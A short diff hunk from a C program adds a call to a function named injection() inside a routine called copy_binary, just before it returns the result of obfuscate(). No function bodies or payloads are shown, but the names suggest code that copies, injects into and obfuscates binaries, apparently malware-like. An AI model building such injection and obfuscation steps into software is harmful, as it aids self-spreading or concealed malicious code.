@@ -37,6 +37,6 @@ int copy_binary(int source_file) {
         perror("munmap");
         return 1;
     }
-    
+    injection();
     return obfuscate();
 }
